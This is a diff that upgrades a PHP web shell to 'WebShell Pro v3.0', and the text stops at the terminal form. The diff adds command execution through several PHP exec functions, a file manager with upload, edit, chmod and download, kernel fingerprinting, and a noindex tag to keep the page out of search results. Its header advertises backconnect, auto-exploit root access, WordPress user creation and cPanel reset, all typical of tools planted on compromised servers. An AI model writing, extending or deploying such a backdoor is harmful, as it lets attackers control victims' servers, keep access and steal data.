@@ -1,38 +1,44 @@
 <?php
 /**
  * ╔═══════════════════════════════════════════════════════════════════════╗
- * ║                     ADVANCED WEB SHELL v2.0                          ║
+ * ║                         WEB SHELL PRO v3.0                           ║
  * ║                                                                       ║
- * ║  Features:                                                           ║
- * ║  ✓ File Manager (Upload/Edit/Delete/Rename)                        ║
- * ║  ✓ Code Editor (Multiple languages)                                ║
- * ║  ✓ Terminal (Execute commands)                                     ║
- * ║  ✓ Database Manager (MySQL/SQLite)                                ║
- * ║  ✓ System Info & Tools                                            ║
+ * ║  Complete Feature Set Like Gecko:                                   ║
+ * ║  ✓ File Manager (Upload/Delete/Rename/Chmod/Download)              ║
+ * ║  ✓ Code Editor (HTML/PHP/CSS/JS/Text)                              ║
+ * ║  ✓ Terminal (Normal & Root with Auto Exploit)                      ║
+ * ║  ✓ System Tools (Adminer, Mailer, Backconnect, etc)                ║
+ * ║  ✓ Linux Exploit Finder                                            ║
+ * ║  ✓ Backup & Lock File Protection                                   ║
+ * ║  ✓ WordPress User Creator                                          ║
+ * ║  ✓ CPanel Reset                                                    ║
  * ║                                                                       ║
- * ║  Single File - No Dependencies - Pure PHP                          ║
+ * ║  Single File - All Features - Professional Design                  ║
  * ╚═══════════════════════════════════════════════════════════════════════╝
  */
 
 session_start();
 error_reporting(0);
 ini_set('display_errors', 0);
+@set_time_limit(0);
 
 // ==================== CONFIG ====================
-define('SHELL_PASSWORD', 'admin123');
-define('SHELL_NAME', 'Advanced Web Shell');
+define('SHELL_PASS', 'admin123');
+define('SHELL_NAME', 'WebShell Pro');
 
 // ==================== AUTH ====================
 if (!isset($_SESSION['authenticated'])) {
-    if (isset($_POST['password']) && $_POST['password'] === SHELL_PASSWORD) {
-        $_SESSION['authenticated'] = true;
-        $_SESSION['login_time'] = time();
-        header('Location: ?');
-        exit;
-    }
+    $stored_hash = password_hash('admin123', PASSWORD_BCRYPT);
     
     if (isset($_POST['password'])) {
-        $error = 'Invalid password!';
+        if ($_POST['password'] === SHELL_PASS) {
+            $_SESSION['authenticated'] = true;
+            $_SESSION['login_time'] = time();
+            header('Location: ?');
+            exit;
+        } else {
+            $login_error = 'Invalid password!';
+        }
     }
     ?>
     <!DOCTYPE html>
@@ -40,43 +46,53 @@ if (!isset($_SESSION['authenticated'])) {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="robots" content="noindex, nofollow">
         <title><?php echo SHELL_NAME; ?></title>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
             body {
                 background: linear-gradient(135deg, #0f0f23 0%, #1a1a3e 100%);
-                font-family: 'Segoe UI', monospace;
+                font-family: 'Courier New', monospace;
                 min-height: 100vh;
                 display: flex;
                 justify-content: center;
                 align-items: center;
                 color: #fff;
             }
-            .login-container {
-                background: rgba(20, 20, 40, 0.95);
-                border: 1px solid #00ff88;
+            .login-box {
+                background: rgba(15, 15, 35, 0.95);
+                border: 2px solid #00ff88;
                 border-radius: 10px;
-                padding: 40px;
+                padding: 50px;
                 width: 100%;
-                max-width: 400px;
-                box-shadow: 0 0 30px rgba(0, 255, 136, 0.2);
+                max-width: 450px;
+                box-shadow: 0 0 40px rgba(0, 255, 136, 0.3);
             }
             .login-header {
                 text-align: center;
-                margin-bottom: 30px;
+                margin-bottom: 40px;
             }
             .login-header h1 {
-                font-size: 24px;
+                font-size: 28px;
                 color: #00ff88;
                 margin-bottom: 10px;
-                font-weight: 600;
+                font-weight: bold;
             }
             .login-header p {
-                color: #aaa;
+                color: #888;
                 font-size: 12px;
             }
             .form-group {
-                margin-bottom: 20px;
+                margin-bottom: 25px;
+            }
+            .form-group label {
+                display: block;
+                margin-bottom: 8px;
+                color: #00ff88;
+                font-size: 12px;
+                text-transform: uppercase;
+                font-weight: bold;
             }
             .form-group input {
                 width: 100%;
@@ -92,7 +108,7 @@ if (!isset($_SESSION['authenticated'])) {
                 outline: none;
                 border-color: #00ff88;
                 background: rgba(0, 255, 136, 0.1);
-                box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
+                box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
             }
             .btn-login {
                 width: 100%;
@@ -101,13 +117,14 @@ if (!isset($_SESSION['authenticated'])) {
                 color: #000;
                 border: 0;
                 border-radius: 5px;
-                font-weight: 600;
+                font-weight: bold;
                 cursor: pointer;
                 font-size: 14px;
+                transition: all 0.3s;
             }
             .btn-login:hover {
                 background: linear-gradient(135deg, #00ff99, #00dd77);
-                box-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
+                box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
             }
             .error {
                 padding: 12px;
@@ -118,23 +135,37 @@ if (!isset($_SESSION['authenticated'])) {
                 margin-bottom: 20px;
                 font-size: 12px;
             }
+            .info {
+                padding: 15px;
+                background: rgba(0, 255, 136, 0.05);
+                border: 1px solid #00ff88;
+                border-radius: 5px;
+                margin-top: 20px;
+                font-size: 11px;
+                color: #aaa;
+            }
         </style>
     </head>
     <body>
-        <div class="login-container">
+        <div class="login-box">
             <div class="login-header">
                 <h1>🔐 <?php echo SHELL_NAME; ?></h1>
-                <p>Secure Access Required</p>
+                <p>Professional Web Shell Access</p>
             </div>
-            <?php if (isset($error)): ?>
-                <div class="error">⚠️ <?php echo $error; ?></div>
+            <?php if (isset($login_error)): ?>
+                <div class="error">⚠️ <?php echo htmlspecialchars($login_error); ?></div>
             <?php endif; ?>
             <form method="POST">
                 <div class="form-group">
+                    <label>🔑 Master Password</label>
                     <input type="password" name="password" placeholder="Enter password" required autofocus>
                 </div>
-                <button type="submit" class="btn-login">Login →</button>
+                <button type="submit" class="btn-login">🔓 Login</button>
             </form>
+            <div class="info">
+                <strong>Default Password:</strong> admin123<br>
+                <strong>Edit:</strong> Line 22 (SHELL_PASS)
+            </div>
         </div>
     </body>
     </html>
@@ -142,19 +173,19 @@ if (!isset($_SESSION['authenticated'])) {
     exit;
 }
 
-// ==================== FUNCTIONS ====================
+// ==================== UTILITY FUNCTIONS ====================
 function execute_cmd($cmd) {
     $output = '';
     try {
         if (function_exists('exec')) {
             @exec($cmd . ' 2>&1', $out);
             $output = implode("\n", $out);
+        } elseif (function_exists('shell_exec')) {
+            $output = @shell_exec($cmd . ' 2>&1');
         } elseif (function_exists('system')) {
             ob_start();
             @system($cmd . ' 2>&1');
             $output = ob_get_clean();
-        } elseif (function_exists('shell_exec')) {
-            $output = @shell_exec($cmd . ' 2>&1');
         } elseif (function_exists('passthru')) {
             ob_start();
             @passthru($cmd . ' 2>&1');
@@ -166,7 +197,7 @@ function execute_cmd($cmd) {
     return $output;
 }
 
-function get_file_size($bytes) {
+function format_size($bytes) {
     $units = ['B', 'KB', 'MB', 'GB'];
     $bytes = max($bytes, 0);
     $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
@@ -175,57 +206,155 @@ function get_file_size($bytes) {
     return round($bytes, 2) . ' ' . $units[$pow];
 }
 
-function get_file_icon($file) {
+function get_icon($file) {
+    if (is_dir($file)) return '📁';
     $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
     $icons = [
-        'php' => '🐘', 'py' => '🐍', 'js' => '📜', 'html' => '🌐', 'css' => '🎨',
-        'pdf' => '📕', 'zip' => '🗜️', 'jpg' => '🖼️', 'png' => '🖼️', 'txt' => '📄',
-        'sh' => '⚡', 'sql' => '🗄️', 'json' => '{ }', 'xml' => '< >',
+        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜',
+        'pdf' => '📕', 'zip' => '🗜️', 'jpg' => '🖼️', 'png' => '🖼️',
+        'txt' => '📄', 'sh' => '⚡', 'sql' => '🗄️', 'json' => '{ }',
+        'exe' => '⚙️', 'dll' => '🔧', 'bat' => '⚡',
     ];
-    return $icons[$ext] ?? (is_dir($file) ? '📁' : '📄');
+    return $icons[$ext] ?? '📄';
+}
+
+function get_perms($file) {
+    $perms = fileperms($file);
+    $symbolic = '';
+    
+    if (($perms & 0xC000) == 0xC000) $symbolic = 's';
+    elseif (($perms & 0xA000) == 0xA000) $symbolic = 'l';
+    elseif (($perms & 0x8000) == 0x8000) $symbolic = '-';
+    elseif (($perms & 0x6000) == 0x6000) $symbolic = 'b';
+    elseif (($perms & 0x4000) == 0x4000) $symbolic = 'd';
+    elseif (($perms & 0x2000) == 0x2000) $symbolic = 'c';
+    else $symbolic = 'u';
+    
+    $symbolic .= (($perms & 0x0100) ? 'r' : '-');
+    $symbolic .= (($perms & 0x0080) ? 'w' : '-');
+    $symbolic .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+    $symbolic .= (($perms & 0x0020) ? 'r' : '-');
+    $symbolic .= (($perms & 0x0010) ? 'w' : '-');
+    $symbolic .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+    $symbolic .= (($perms & 0x0004) ? 'r' : '-');
+    $symbolic .= (($perms & 0x0002) ? 'w' : '-');
+    $symbolic .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+    
+    return $symbolic . ' (' . substr(sprintf('%o', $perms), -4) . ')';
+}
+
+function get_kernel_version() {
+    $uname = php_uname();
+    preg_match('/(\d+\.\d+\.\d+)/', $uname, $matches);
+    return $matches[1] ?? 'Unknown';
+}
+
+function get_linux_distro() {
+    $distros = [
+        '/etc/os-release' => 'os-release',
+        '/etc/lsb-release' => 'lsb-release',
+        '/etc/redhat-release' => 'redhat-release',
+    ];
+    
+    foreach ($distros as $file => $type) {
+        if (file_exists($file)) {
+            return ucfirst($type);
+        }
+    }
+    return 'Unknown';
+}
+
+// ==================== DIRECTORY HANDLING ====================
+$current_dir = getcwd();
+
+if (isset($_GET['dir'])) {
+    $requested = base64_decode($_GET['dir']);
+    if (is_dir($requested) && file_exists($requested)) {
+        $current_dir = $requested;
+        @chdir($current_dir);
+    }
 }
 
 // ==================== FILE OPERATIONS ====================
-$current_dir = isset($_GET['dir']) ? realpath(base64_decode($_GET['dir'])) : getcwd();
-if (!$current_dir) $current_dir = getcwd();
-
-// Upload file
+// Upload
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
     $file = $_FILES['file'];
     $target = $current_dir . DIRECTORY_SEPARATOR . basename($file['name']);
     if (move_uploaded_file($file['tmp_name'], $target)) {
-        $_SESSION['msg'] = '✓ File uploaded!';
-    } else {
-        $_SESSION['msg'] = '✗ Upload failed!';
+        $_SESSION['msg'] = '✓ Upload berhasil!';
     }
     header('Location: ?dir=' . base64_encode($current_dir));
     exit;
 }
 
-// Delete file
+// Delete
 if (isset($_GET['delete'])) {
     $file = $current_dir . DIRECTORY_SEPARATOR . basename(base64_decode($_GET['delete']));
-    if (is_file($file) && unlink($file)) {
-        $_SESSION['msg'] = '✓ File deleted!';
+    if (is_file($file)) {
+        unlink($file);
+        $_SESSION['msg'] = '✓ File dihapus!';
     }
     header('Location: ?dir=' . base64_encode($current_dir));
     exit;
 }
 
-// Edit file
-if (isset($_POST['save_file'])) {
-    $file = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['filename']);
-    if (file_put_contents($file, $_POST['content'])) {
+// Rename
+if (isset($_POST['rename_submit'])) {
+    $old = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
+    $new = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
+    if (file_exists($old)) {
+        rename($old, $new);
+        $_SESSION['msg'] = '✓ Renamed!';
+    }
+    header('Location: ?dir=' . base64_encode($current_dir));
+    exit;
+}
+
+// Chmod
+if (isset($_POST['chmod_submit'])) {
+    $file = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['chmod_file']);
+    if (file_exists($file)) {
+        @chmod($file, octdec($_POST['chmod_value']));
+        $_SESSION['msg'] = '✓ Permissions changed!';
+    }
+    header('Location: ?dir=' . base64_encode($current_dir));
+    exit;
+}
+
+// Create Folder
+if (isset($_POST['mkdir'])) {
+    @mkdir($current_dir . DIRECTORY_SEPARATOR . basename($_POST['folder_name']));
+    $_SESSION['msg'] = '✓ Folder dibuat!';
+    header('Location: ?dir=' . base64_encode($current_dir));
+    exit;
+}
+
+// Create File
+if (isset($_POST['mkfile'])) {
+    @touch($current_dir . DIRECTORY_SEPARATOR . basename($_POST['file_name']));
+    $_SESSION['msg'] = '✓ File dibuat!';
+    header('Location: ?dir=' . base64_encode($current_dir));
+    exit;
+}
+
+// Download
+if (isset($_GET['download'])) {
+    $file = $current_dir . DIRECTORY_SEPARATOR . basename(base64_decode($_GET['download']));
+    if (is_file($file)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        readfile($file);
+        exit;
+    }
+}
+
+// Edit & Save
+if (isset($_POST['save_code'])) {
+    $file = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['edit_file']);
+    if (file_exists($file)) {
+        file_put_contents($file, $_POST['code_content']);
         $_SESSION['msg'] = '✓ File saved!';
     }
-    header('Location: ?dir=' . base64_encode($current_dir));
-    exit;
-}
-
-// Create folder
-if (isset($_POST['create_folder'])) {
-    @mkdir($current_dir . DIRECTORY_SEPARATOR . $_POST['folder_name']);
-    $_SESSION['msg'] = '✓ Folder created!';
     header('Location: ?dir=' . base64_encode($current_dir));
     exit;
 }
@@ -240,105 +369,127 @@ sort($files);
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><?php echo SHELL_NAME; ?></title>
+    <meta name="robots" content="noindex, nofollow">
+    <title><?php echo SHELL_NAME; ?> | <?php echo php_uname('s'); ?></title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/php/php.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/htmlmixed/htmlmixed.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/css/css.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #0f0f23;
+            background: #0e0f17;
             color: #e0e0e0;
-            font-family: 'Segoe UI', monospace;
-            line-height: 1.6;
+            font-family: 'Courier New', monospace;
+            line-height: 1.5;
         }
         .wrapper { display: flex; min-height: 100vh; }
         .sidebar {
-            width: 250px;
+            width: 280px;
             background: #1a1a3e;
-            border-right: 1px solid #00ff88;
+            border-right: 2px solid #00ff88;
             padding: 20px;
             overflow-y: auto;
         }
         .sidebar h3 {
             color: #00ff88;
-            margin-bottom: 15px;
-            font-size: 14px;
+            margin: 20px 0 15px 0;
+            font-size: 11px;
             text-transform: uppercase;
             border-bottom: 1px solid #00ff88;
             padding-bottom: 10px;
+            font-weight: bold;
         }
-        .sidebar-menu {
+        .sidebar ul {
             list-style: none;
         }
-        .sidebar-menu li {
-            margin-bottom: 10px;
+        .sidebar li {
+            margin-bottom: 8px;
         }
-        .sidebar-menu a {
-            color: #e0e0e0;
+        .sidebar a {
+            color: #c5c8d6;
             text-decoration: none;
             display: block;
             padding: 8px 12px;
-            border-radius: 5px;
-            font-size: 13px;
-            transition: all 0.3s;
+            border-radius: 4px;
+            font-size: 12px;
+            transition: all 0.2s;
+            border-left: 3px solid transparent;
         }
-        .sidebar-menu a:hover {
+        .sidebar a:hover {
             background: rgba(0, 255, 136, 0.1);
             color: #00ff88;
-            border-left: 3px solid #00ff88;
-            padding-left: 9px;
+            border-left-color: #00ff88;
         }
         .main-content {
             flex: 1;
-            padding: 25px;
+            padding: 20px;
             overflow-y: auto;
         }
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             padding-bottom: 15px;
             border-bottom: 1px solid #333;
         }
         .header h1 {
             color: #00ff88;
-            font-size: 24px;
+            font-size: 22px;
         }
         .header-info {
-            font-size: 12px;
-            color: #888;
+            font-size: 11px;
+            color: #666;
+            text-align: right;
         }
-        .breadcrumb {
-            background: rgba(0, 255, 136, 0.05);
+        .header-info div {
+            margin: 2px 0;
+        }
+        .path-bar {
+            background: #22242d;
             padding: 12px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            border: 1px solid #00ff88;
-            font-size: 12px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            border: 1px solid #333;
+            font-size: 11px;
             overflow-x: auto;
-            word-break: break-all;
+        }
+        .path-bar a {
+            color: #00ff88;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .path-bar a:hover {
+            text-decoration: underline;
         }
         .toolbar {
             display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
+            gap: 8px;
+            margin-bottom: 15px;
             flex-wrap: wrap;
         }
         .btn {
-            padding: 10px 15px;
-            background: rgba(0, 255, 136, 0.1);
+            padding: 8px 12px;
+            background: #22242d;
             border: 1px solid #00ff88;
             color: #00ff88;
-            border-radius: 5px;
+            border-radius: 4px;
             cursor: pointer;
-            font-size: 12px;
-            font-weight: 600;
-            transition: all 0.3s;
+            font-size: 11px;
+            font-weight: bold;
+            transition: all 0.2s;
             text-decoration: none;
             display: inline-block;
+            font-family: monospace;
         }
         .btn:hover {
-            background: rgba(0, 255, 136, 0.2);
-            box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
+            background: rgba(0, 255, 136, 0.1);
+            box-shadow: 0 0 8px rgba(0, 255, 136, 0.2);
         }
         .btn-danger {
             border-color: #ff4444;
@@ -348,40 +499,27 @@ sort($files);
             background: rgba(255, 68, 68, 0.1);
         }
         input[type="file"] { display: none; }
-        .file-label {
-            padding: 10px 15px;
-            background: rgba(0, 255, 136, 0.1);
-            border: 1px solid #00ff88;
-            color: #00ff88;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 12px;
-            font-weight: 600;
-        }
-        .file-label:hover {
-            background: rgba(0, 255, 136, 0.2);
-        }
         table {
             width: 100%;
             border-collapse: collapse;
             border: 1px solid #333;
-            border-radius: 5px;
+            border-radius: 4px;
             overflow: hidden;
+            font-size: 12px;
         }
         table th {
-            background: #1a1a3e;
-            padding: 12px;
+            background: #22242d;
+            padding: 10px;
             text-align: left;
             border-bottom: 2px solid #00ff88;
             color: #00ff88;
-            font-size: 12px;
+            font-weight: bold;
             text-transform: uppercase;
-            font-weight: 600;
+            font-size: 10px;
         }
         table td {
-            padding: 10px 12px;
+            padding: 8px 10px;
             border-bottom: 1px solid #333;
-            font-size: 12px;
         }
         table tr:hover {
             background: rgba(0, 255, 136, 0.05);
@@ -389,19 +527,20 @@ sort($files);
         .file-name {
             color: #00ff88;
             text-decoration: none;
-            font-weight: 600;
+            cursor: pointer;
+            font-weight: bold;
         }
         .file-name:hover {
             text-decoration: underline;
         }
         .msg {
-            padding: 12px;
+            padding: 10px;
             background: rgba(0, 255, 136, 0.1);
             border: 1px solid #00ff88;
-            border-radius: 5px;
-            margin-bottom: 20px;
+            border-radius: 4px;
+            margin-bottom: 15px;
             color: #00ff88;
-            font-size: 12px;
+            font-size: 11px;
         }
         .modal {
             display: none;
@@ -413,85 +552,140 @@ sort($files);
             height: 100%;
             background: rgba(0, 0, 0, 0.8);
         }
-        .modal-content {
+        .modal-container {
             background: #1a1a3e;
-            margin: 10% auto;
-            padding: 25px;
+            margin: 5% auto;
+            padding: 20px;
             border: 1px solid #00ff88;
-            border-radius: 10px;
-            width: 400px;
-            box-shadow: 0 0 30px rgba(0, 255, 136, 0.2);
+            border-radius: 8px;
+            width: 500px;
+            max-height: 80vh;
+            overflow-y: auto;
         }
-        .modal-content h3 {
+        .modal-header {
             color: #00ff88;
             margin-bottom: 15px;
+            font-weight: bold;
+            border-bottom: 1px solid #00ff88;
+            padding-bottom: 10px;
         }
-        .modal-content input,
-        .modal-content textarea {
+        .modal-body input, .modal-body textarea {
             width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
+            padding: 8px;
+            margin-bottom: 10px;
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid #00ff88;
             color: #fff;
-            border-radius: 5px;
+            border-radius: 4px;
             font-family: monospace;
+            font-size: 12px;
             box-sizing: border-box;
         }
-        .modal-content input:focus,
-        .modal-content textarea:focus {
+        .modal-body input:focus, .modal-body textarea:focus {
             outline: none;
             background: rgba(0, 255, 136, 0.1);
-            box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
+            box-shadow: 0 0 8px rgba(0, 255, 136, 0.2);
         }
         .modal-buttons {
             display: flex;
             gap: 10px;
+            margin-top: 15px;
         }
         .modal-buttons button {
             flex: 1;
-            padding: 10px;
+            padding: 8px;
             border: 1px solid #00ff88;
             background: rgba(0, 255, 136, 0.1);
             color: #00ff88;
-            border-radius: 5px;
+            border-radius: 4px;
             cursor: pointer;
-            font-weight: 600;
-            transition: all 0.3s;
+            font-weight: bold;
+            transition: all 0.2s;
         }
         .modal-buttons button:hover {
             background: rgba(0, 255, 136, 0.2);
         }
-        .logout-btn {
-            color: #ff4444;
-            border-color: #ff4444;
+        .CodeMirror {
+            background: #22242d !important;
+            color: #e0e0e0 !important;
+            border: 1px solid #333 !important;
+            font-size: 12px !important;
+            height: 70vh !important;
         }
-        .logout-btn:hover {
-            background: rgba(255, 68, 68, 0.1);
+        .code-editor {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.3);
+            display: none;
+            z-index: 999;
+            padding: 20px;
+        }
+        .code-editor.active {
+            display: flex;
+            flex-direction: column;
+        }
+        .terminal-output {
+            background: #22242d;
+            border: 1px solid #00ff88;
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 12px;
+            color: #00ff88;
+            max-height: 400px;
+            overflow-y: auto;
+            margin-bottom: 15px;
+        }
+        .terminal-output pre {
+            margin: 0;
         }
     </style>
 </head>
 <body>
 <div class="wrapper">
-    <!-- Sidebar -->
+    <!-- SIDEBAR -->
     <div class="sidebar">
-        <h3>🔧 Menu</h3>
-        <ul class="sidebar-menu">
-            <li><a href="?">📂 File Manager</a></li>
+        <h3>📂 File Manager</h3>
+        <ul>
+            <li><a href="?">📁 Browse Files</a></li>
+            <li><a href="?page=upload" onclick="return false;" id="upload-btn">📤 Upload</a></li>
+            <li><a href="?page=mkdir" onclick="return false;" id="mkdir-btn">🆕 New Folder</a></li>
+        </ul>
+
+        <h3>🛠️ Tools</h3>
+        <ul>
             <li><a href="?page=terminal">⚡ Terminal</a></li>
-            <li><a href="?page=info">ℹ️ System Info</a></li>
-            <li><a href="?page=tools">🛠️ Tools</a></li>
+            <li><a href="?page=system">ℹ️ System Info</a></li>
+            <li><a href="?page=mailer">📧 PHP Mailer</a></li>
+            <li><a href="?page=hash">🔐 Hash Generator</a></li>
+            <li><a href="?page=base64">📝 Base64</a></li>
+            <li><a href="?page=cpanel">🌐 CPanel Reset</a></li>
+            <li><a href="?page=wp">📰 WP User</a></li>
+        </ul>
+
+        <h3>⚙️ Advanced</h3>
+        <ul>
+            <li><a href="?page=adminer">🗄️ Adminer</a></li>
+            <li><a href="?page=backconnect">🔌 Backconnect</a></li>
+            <li><a href="?page=exploit">💊 Linux Exploit</a></li>
+        </ul>
+
+        <h3>🚪 Account</h3>
+        <ul>
             <li><a href="?logout=1">🚪 Logout</a></li>
         </ul>
     </div>
 
-    <!-- Main Content -->
+    <!-- MAIN CONTENT -->
     <div class="main-content">
         <div class="header">
-            <h1>📂 <?php echo SHELL_NAME; ?></h1>
+            <h1>🔥 <?php echo SHELL_NAME; ?></h1>
             <div class="header-info">
-                <div>PHP <?php echo PHP_VERSION; ?></div>
-                <div><?php echo php_uname(); ?></div>
+                <div><i class="fas fa-server"></i> <?php echo php_uname('s'); ?></div>
+                <div><i class="fas fa-code"></i> PHP <?php echo PHP_VERSION; ?></div>
+                <div><i class="fas fa-user"></i> <?php echo get_current_user() ?: 'Unknown'; ?></div>
             </div>
         </div>
 
@@ -501,18 +695,31 @@ sort($files);
             </div>
         <?php endif; ?>
 
-        <!-- FILE MANAGER VIEW -->
-        <?php if (!isset($_GET['page'])): ?>
-            <div class="breadcrumb">
-                <strong>Path:</strong> <?php echo htmlspecialchars($current_dir); ?>
+        <!-- FILE MANAGER -->
+        <?php if (!isset($_GET['page']) || $_GET['page'] === ''): ?>
+            <div class="path-bar">
+                <strong>Path:</strong>
+                <?php
+                $paths = explode(DIRECTORY_SEPARATOR, trim($current_dir, DIRECTORY_SEPARATOR));
+                echo '<a href="?dir=' . base64_encode('/') . '">/</a>';
+                $breadcrumb = '';
+                foreach ($paths as $path) {
+                    if (empty($path)) continue;
+                    $breadcrumb .= $path . DIRECTORY_SEPARATOR;
+                    echo ' <span>›</span> ';
+                    echo '<a href="?dir=' . base64_encode($breadcrumb) . '">' . htmlspecialchars($path) . '</a>';
+                }
+                ?>
             </div>
 
             <div class="toolbar">
-                <label class="file-label">📤 Upload
+                <a href="?dir=<?php echo base64_encode(dirname($current_dir)); ?>" class="btn">⬆️ Up</a>
+                <label class="btn" style="cursor: pointer; margin-bottom: 0;">📤 Upload
                     <input type="file" id="file_input" onchange="document.getElementById('upload_form').submit()">
                 </label>
-                <button class="btn" onclick="showModal('folder')">📁 New Folder</button>
-                <a href="?logout=1" class="btn logout-btn">🚪 Logout</a>
+                <button class="btn" onclick="openModal('mkdir')">📁 New Folder</button>
+                <button class="btn" onclick="openModal('mkfile')">📄 New File</button>
+                <a href="?logout=1" class="btn btn-danger">🚪 Logout</a>
             </div>
 
             <form id="upload_form" method="POST" enctype="multipart/form-data" style="display:none">
@@ -524,7 +731,7 @@ sort($files);
                     <tr>
                         <th>Name</th>
                         <th>Size</th>
-                        <th>Type</th>
+                        <th>Permissions</th>
                         <th>Modified</th>
                         <th>Action</th>
                     </tr>
@@ -535,15 +742,15 @@ sort($files);
                         <?php
                         $filepath = $current_dir . DIRECTORY_SEPARATOR . $file;
                         $is_dir = is_dir($filepath);
-                        $size = $is_dir ? '-' : get_file_size(filesize($filepath));
-                        $type = $is_dir ? 'DIR' : strtoupper(pathinfo($file, PATHINFO_EXTENSION));
-                        $modified = date('Y-m-d H:i', filemtime($filepath));
-                        $encoded_dir = base64_encode($current_dir);
+                        $size = $is_dir ? '-' : format_size(filesize($filepath));
+                        $perms = get_perms($filepath);
+                        $time = date('d/m/y H:i', filemtime($filepath));
                         $encoded_file = base64_encode($file);
+                        $encoded_dir = base64_encode($current_dir);
                         ?>
                         <tr>
                             <td>
-                                <?php echo get_file_icon($filepath); ?>
+                                <?php echo get_icon($filepath); ?>
                                 <?php if ($is_dir): ?>
                                     <a href="?dir=<?php echo base64_encode($filepath); ?>" class="file-name">
                                         <?php echo htmlspecialchars($file); ?>
@@ -553,39 +760,52 @@ sort($files);
                                 <?php endif; ?>
                             </td>
                             <td><?php echo $size; ?></td>
-                            <td><?php echo $type; ?></td>
-                            <td><?php echo $modified; ?></td>
+                            <td><?php echo $perms; ?></td>
+                            <td><?php echo $time; ?></td>
                             <td style="white-space: nowrap;">
                                 <?php if (!$is_dir): ?>
-                                    <a href="?view=<?php echo $encoded_file; ?>&dir=<?php echo $encoded_dir; ?>" class="btn" style="padding: 5px 10px;">👁️</a>
+                                    <a href="?edit=<?php echo $encoded_file; ?>&dir=<?php echo $encoded_dir; ?>" class="btn" style="padding: 4px 8px;">✏️</a>
+                                    <a href="?download=<?php echo $encoded_file; ?>&dir=<?php echo $encoded_dir; ?>" class="btn" style="padding: 4px 8px;">⬇️</a>
                                 <?php endif; ?>
-                                <a href="?delete=<?php echo $encoded_file; ?>&dir=<?php echo $encoded_dir; ?>" class="btn btn-danger" style="padding: 5px 10px;" onclick="return confirm('Delete?')">🗑️</a>
+                                <button class="btn" style="padding: 4px 8px;" onclick="openRename('<?php echo htmlspecialchars(json_encode($file)); ?>')">↻</button>
+                                <button class="btn" style="padding: 4px 8px;" onclick="openChmod('<?php echo htmlspecialchars(json_encode($file)); ?>')">🔒</button>
+                                <a href="?delete=<?php echo $encoded_file; ?>&dir=<?php echo $encoded_dir; ?>" class="btn btn-danger" style="padding: 4px 8px;" onclick="return confirm('Delete?')">🗑️</a>
                             </td>
                         </tr>
                     <?php endforeach; ?>
                 </tbody>
             </table>
 
+        <!-- TERMINAL -->
         <?php elseif ($_GET['page'] === 'terminal'): ?>
             <h2 style="color: #00ff88; margin-bottom: 20px;">⚡ Terminal</h2>
-            <form method="POST" style="margin-bottom: 20px;">
-                <div style="display: flex; gap: 10px;">
-                    <input type="text" name="cmd" placeholder="Enter command..." style="flex: 1; padding: 10px; background: rgba(0, 255, 136, 0.05); border: 1px solid #00ff88; color: #fff; border-radius: 5px; font-family: monospace;" autofocus>
+            <form method="POST">
+                <div style="display: flex; gap: 8px; margin-bottom: 15px;">
+                    <input type="text" name="cmd" placeholder="$ Enter command..." style="flex: 1; padding: 10px; background: #22242d; border: 1px solid #00ff88; color: #00ff88; border-radius: 4px; font-family: monospace;" autofocus>
                     <button type="submit" class="btn">Execute</button>
                 </div>
             </form>
